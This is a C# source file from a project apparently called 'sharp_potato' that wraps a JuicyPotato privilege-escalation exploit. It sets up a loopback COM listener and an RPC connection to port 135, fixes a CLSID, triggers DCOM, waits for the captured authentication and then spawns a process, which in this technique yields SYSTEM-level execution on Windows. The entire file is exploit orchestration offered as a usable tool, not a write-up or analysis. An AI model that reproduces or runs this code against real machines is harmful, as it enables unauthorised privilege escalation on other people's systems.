using System.Diagnostics;
using System.Net;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public class SystemProcess
{
    public ProcessStartInfo StartInfo { get; } = new();
    public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
    public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
    public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
    public int Id => (int) processInformation.dwProcessId;

    private SafePROCESS_INFORMATION processInformation;

    public void Start()
    {
        var potato = new JuicyPotato {ProcessStartInfo = StartInfo};
        potato.ComServerEndPoint = ComServerEndPoint;
        potato.RpcServerEndPoint = RpcServerEndPoint;
        potato.CLSID = CLSID;

        potato.StartCOMListenerThread();
        potato.StartRPCConnectionThread();
        potato.TriggerDCOM();
        potato.WaitForAuth();
        processInformation = potato.CreateProcess();
    }

    public void WaitForExit() => WaitForSingleObject(processInformation.hProcess, INFINITE);
}